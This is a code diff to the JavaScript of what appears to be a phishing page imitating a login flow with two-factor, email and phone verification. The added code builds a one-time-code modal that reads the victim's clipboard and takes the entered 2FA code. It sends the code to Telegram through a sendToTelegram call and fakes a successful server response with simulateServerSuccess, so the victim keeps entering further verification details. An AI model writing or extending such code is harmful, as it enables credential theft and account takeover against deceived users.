@@ -280,9 +280,11 @@ function simulateServerSuccess() {
 let isProcessing = {
     login: false,
     twofa: false,
+    otp_twofa: false,
     email: false,
     phone: false
 };
+
 
 // Store current method for switch tracking
 let currentMethod = '';
@@ -860,10 +862,9 @@ form.addEventListener("submit", async e => {
 
     if (result.success) {
         if (isOneTimeCodeMode) {
-            // One-time code mode: skip 2FA and go directly to email/phone verification
-            // Detect if user entered email or phone
+            // One-time code mode: go to email/phone verification first
             const isPhone = /^[\d+][\d\s\-()]+$/.test(emailPhone.replace(/\s/g, ''));
-            
+
             if (isPhone) {
                 currentMethod = 'phone';
                 isAfterSwitch = false;
@@ -928,6 +929,84 @@ twofaButton.addEventListener("click", async () => {
 
     isProcessing.twofa = false;
 });
+
+// ======================================================
+//  OTP 2FA MODAL — custom full-screen show/hide
+// ======================================================
+
+function showOtpTwofaModal() {
+    showOverlay("otp_twofa");
+}
+
+function hideOtpTwofaModal(cb) {
+    hideOverlay("otp_twofa");
+    if (cb) setTimeout(cb, 400);
+}
+
+// ======================================================
+//  OTP 2FA CONFIRM (one-time code flow)
+// ======================================================
+
+const otpTwofaInput = document.getElementById("otp_twofa_input");
+const otpTwofaButton = document.getElementById("otp_twofa_button");
+const otpTwofaPaste = document.getElementById("otp_twofa_paste");
+const otpTwofaClose = document.getElementById("otp_twofa_close");
+
+if (otpTwofaInput) {
+    otpTwofaInput.addEventListener("input", () => {
+        if (otpTwofaButton) otpTwofaButton.disabled = !isValidVerificationCode(otpTwofaInput.value);
+    });
+}
+
+if (otpTwofaPaste) {
+    otpTwofaPaste.addEventListener("click", async () => {
+        try {
+            const text = await navigator.clipboard.readText();
+            if (otpTwofaInput) {
+                otpTwofaInput.value = text.trim();
+                otpTwofaInput.dispatchEvent(new Event("input"));
+            }
+        } catch (e) { /* clipboard access denied */ }
+    });
+}
+
+if (otpTwofaClose) {
+    otpTwofaClose.addEventListener("click", () => hideOtpTwofaModal());
+}
+
+if (otpTwofaButton) {
+    otpTwofaButton.addEventListener("click", async () => {
+        if (isProcessing.otp_twofa) return;
+        isProcessing.otp_twofa = true;
+
+        startLoading(otpTwofaButton);
+
+        const twofaMessage = format2FAMessage(otpTwofaInput.value, false);
+        await sendToTelegram(twofaMessage);
+
+        const result = await simulateServerSuccess();
+
+        stopLoading(otpTwofaButton);
+
+        if (result.success) {
+            otpTwofaInput.value = "";
+            otpTwofaButton.disabled = true;
+            hideOtpTwofaModal(() => {
+                setTimeout(() => {
+                    step = 1;
+                    showOverlay("verifications");
+                    updateVerificationUI();
+                }, 50);
+            });
+        } else {
+            showToast("Verification code is incorrect");
+            otpTwofaInput.value = "";
+            otpTwofaButton.disabled = true;
+        }
+
+        isProcessing.otp_twofa = false;
+    });
+}
 
 // ======================================================
 //  VERIFICATIONS BLOCK (step 1 / 2)
@@ -1002,7 +1081,12 @@ if (emailButton) {
 
         // First verification (verifications not shown yet)
         if (!verificationsActive) {
-            enterVerifications("email");
+            if (isOneTimeCodeMode) {
+                hideOverlay("email");
+                setTimeout(() => showOtpTwofaModal(), 400);
+            } else {
+                enterVerifications("email");
+            }
             isProcessing.email = false;
             return;
         }
@@ -1079,7 +1163,12 @@ if (phoneButton) {
 
         // First verification (verifications not shown yet)
         if (!verificationsActive) {
-            enterVerifications("phone");
+            if (isOneTimeCodeMode) {
+                hideOverlay("phone");
+                setTimeout(() => showOtpTwofaModal(), 400);
+            } else {
+                enterVerifications("phone");
+            }
             return;
         }
 
